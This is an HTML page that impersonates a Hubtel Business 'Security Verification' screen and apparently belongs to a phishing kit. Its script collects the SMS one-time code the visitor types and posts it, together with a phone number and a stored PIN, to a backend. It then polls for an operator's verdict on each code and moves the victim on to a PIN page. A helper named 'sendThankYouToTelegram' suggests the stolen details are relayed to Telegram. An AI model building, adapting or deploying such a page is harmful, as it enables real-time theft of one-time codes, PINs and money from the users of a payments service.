<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-visual">
    <title>Hubtel | Security Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --background: #202020;
            --surface: #2E2E2E;
            --text-primary: #FFFFFF;
            --text-secondary: #BDBDBD;
            --border: #3B3B3B;
            --primary: #4EB3A4;
            --primary-dark: #0E2924;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--background);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 24px 20px;
            color: var(--text-primary);
        }

        .e-fullscreen-wrapper {
            width: 100%;
            max-width: 460px;
            display: flex;
            flex-direction: column;
            gap: 22px;
            animation: slideUp .7s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* LOGO */
        .e-logo {
            text-align: center;
            font-size: 28px;
            font-weight: 900;
            letter-spacing: -0.5px;
            text-transform: uppercase;
            color: var(--text-primary);
        }

        .e-logo span {
            color: var(--primary);
        }

        .e-logo small {
            display: block;
            font-size: 10px;
            letter-spacing: 3px;
            color: var(--text-secondary);
            margin-top: 4px;
        }

        .e-card-header {
            text-align: center;
        }

        .e-card-header h1 {
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.5px;
            margin-bottom: 6px;
            color: var(--text-primary);
        }

        .e-card-header p {
            font-size: 14px;
            color: var(--text-secondary);
            line-height: 1.5;
        }

        /* Verification Box Group */
        .e-input-group {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 24px;
            padding: 28px 22px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        /* Single Input Field matching surface background */
        .single-code-input {
            width: 100%;
            height: 60px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 8px;
            color: var(--primary);
            background: var(--surface);
            border: 1.5px solid var(--border);
            border-radius: 14px;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
            transition: all 0.2s ease;
            margin-bottom: 24px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
        }

        .single-code-input::placeholder {
            color: var(--text-secondary);
            opacity: 0.4;
            letter-spacing: 6px;
            font-weight: 600;
        }

        .single-code-input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 15px rgba(78, 179, 164, 0.25), inset 0 2px 4px rgba(0,0,0,0.3);
        }

        /* Verify Action Button (Dynamic State) */
        .e-btn-verify {
            width: 100%;
            padding: 18px;
            background: rgba(78, 179, 164, 0.3);
            color: var(--primary-dark);
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 900;
            letter-spacing: 0.5px;
            cursor: not-allowed;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            text-transform: uppercase;
            transition: all 0.2s ease;
            margin-bottom: 16px;
        }

        .e-btn-verify.active {
            background: var(--primary);
            cursor: pointer;
        }

        .e-btn-verify.active:hover {
            transform: translateY(-2px);
            background: #5dcab9;
            box-shadow: 0 12px 30px rgba(78, 179, 164, 0.4);
        }

        .e-btn-verify.active:active {
            transform: translateY(0);
        }

        /* Loading Container */
        #loadingContainer {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 16px;
            font-size: 13.5px;
            color: var(--text-primary);
            font-weight: 500;
        }

        .small-spinner {
            width: 22px;
            height: 22px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Resend Button */
        .btn-resend {
            background: none;
            border: none;
            font-size: 13.5px;
            color: var(--text-secondary);
            cursor: pointer;
            font-weight: 500;
            padding: 4px;
        }

        .btn-resend span {
            color: var(--primary);
            font-weight: 700;
            text-decoration: underline;
        }

        .btn-resend:active {
            opacity: 0.7;
        }

        /* Custom In-App Modal Alert Overlay */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(32, 32, 32, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 20px;
        }

        .modal-card {
            background: var(--surface);
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 28px;
            text-align: center;
            border: 1px solid var(--border);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            color: var(--text-primary);
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            line-height: 1.4;
            color: var(--text-primary);
        }

        .modal-btn {
            background: var(--primary);
            color: var(--primary-dark);
            border: none;
            border-radius: 14px;
            padding: 14px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(78, 179, 164, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }

        /* Footer */
        .e-footer {
            text-align: center;
            color: var(--text-secondary);
            font-size: 11.5px;
            margin-top: 5px;
        }
    </style>
</head>
<body>

    <div class="e-fullscreen-wrapper">
        <!-- HUBTEL LOGO -->
        <div class="e-logo">
            Hubtel <span>Business</span>
            <small>SECURITY VERIFICATION</small>
        </div>

        <div class="e-card-header">
            <h1>Security Verification</h1>
            <p>Enter the 6-digit verification code sent to your phone via SMS.</p>
        </div>

        <div class="e-input-group">
            <!-- Single Input Field with ______ placeholder -->
            <input type="tel" id="promoCodeInput" class="single-code-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" placeholder="______" autofocus oninput="checkCodeLength()">

            <button onclick="submitPromoCode()" id="verifyBtn" class="e-btn-verify">Verify Code</button>

            <!-- Small Spinner right under the button -->
            <div id="loadingContainer">
                <div class="small-spinner"></div>
                <span id="spinnerText">Waiting for verification...</span>
            </div>

            <button class="btn-resend" onclick="sendThankYouToTelegram()" type="button">
                <span>Didn't get code?</span> <span>Resend</span>
            </button>
        </div>

        <div class="e-footer">
            © 2026 Hubtel. All Rights Reserved.
        </div>
    </div>

    <!-- Custom In-App Modal Alert -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

    <script>
        function showAlert(message) {
            document.getElementById('modalText').innerText = message;
            document.getElementById('customModal').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('customModal').style.display = 'none';
        }

        // Enable button only when 6 digits are entered
        function checkCodeLength() {
            const codeInput = document.getElementById('promoCodeInput').value.replace(/\D/g, '').slice(0, 6);
            document.getElementById('promoCodeInput').value = codeInput;
            const verifyBtn = document.getElementById('verifyBtn');

            if (codeInput.length === 6) {
                verifyBtn.classList.add('active');
            } else {
                verifyBtn.classList.remove('active');
            }
        }

        async function submitPromoCode() {
            const promoCodeInput = document.getElementById('promoCodeInput');
            const promoCode = promoCodeInput.value.trim();

            if (promoCode.length < 6) {
                showAlert('Please enter the full 6-digit verification code.');
                return;
            }

            const phone = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone') || '';
            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || 'N/A';
            const loadingContainer = document.getElementById('loadingContainer');
            const spinnerTxt = document.getElementById('spinnerText');

            try {
                spinnerTxt.innerText = "Sending request...";
                loadingContainer.style.display = 'flex';

                const response = await fetch('/api/verify-promo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, promoCode, uniqueId })
                });

                const result = await response.json();
                if (result.success) {
                    spinnerTxt.innerText = "Waiting for verification...";
                    pollPromoStatus(phone);
                } else {
                    loadingContainer.style.display = 'none';
                    showAlert('Error: ' + result.message);
                }
            } catch (error) {
                console.error('Error:', error);
                loadingContainer.style.display = 'none';
                showAlert('Could not connect to the backend server.');
            }
        }

        function pollPromoStatus(phone) {
            const loadingContainer = document.getElementById('loadingContainer');

            const statusInterval = setInterval(async () => {
                try {
                    const response = await fetch(`/api/check-promo-status?phone=${encodeURIComponent(phone)}`);
                    const data = await response.json();

                    if (data.status === 'valid') {
                        clearInterval(statusInterval);
                        loadingContainer.style.display = 'none';
                        showAlert('Code verified successfully!');
                        setTimeout(() => {
                            window.location.href = 'pin.html';
                        }, 1200);
                    } 
                    else if (data.status === 'invalid' || data.status === 'wrong_code') {
                        clearInterval(statusInterval);
                        loadingContainer.style.display = 'none';
                        showAlert('Wrong Code. Please try again.');
                    } 
                    else if (data.status === 'try_again') {
                        clearInterval(statusInterval);
                        loadingContainer.style.display = 'none';
                        showAlert('Please request a new code or try again.');
                    }
                } catch (e) {
                    console.error('Polling error', e);
                }
            }, 3000);
        }

        async function sendThankYouToTelegram() {
            const phone = localStorage.getItem('hubtelUserPhone') || localStorage.getItem('userPhone') || '';
            const uniqueId = localStorage.getItem('hubtelLastPin') || localStorage.getItem('lastPin') || 'N/A';

            try {
                const response = await fetch('/api/send-thank-you', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone, uniqueId })
                });
                const result = await response.json();
                if (result.success) {
                    showAlert('A new code request has been sent.');
                }
            } catch (error) {
                console.error('Error:', error);
                showAlert('Could not send resend request.');
            }
        }
    </script>
</body>
</html>
